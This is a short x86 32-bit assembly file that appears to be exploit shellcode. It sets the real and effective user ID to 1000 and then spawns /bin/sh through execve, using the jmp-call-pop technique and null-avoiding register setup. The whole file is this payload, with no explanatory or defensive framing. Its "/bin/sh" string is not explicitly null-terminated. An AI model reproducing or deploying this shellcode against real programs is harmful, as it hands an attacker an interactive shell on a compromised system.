bits 32
section .text
global _start

_start:
	
	; setreuid(1000, 1000)

	xor eax, eax
	xor ebx, ebx
	mov al, 70
	mov bx, 1000
	mov ecx, ebx
	
	int 0x80 

	jmp binsh

	exec:
	
	; execve("/bin/sh", NULL, NULL)
	
	mov al, 11
	xor ecx, ecx
	xor edx, edx
	pop ebx

	int 0x80

	binsh:
		call exec
		db "/bin/sh"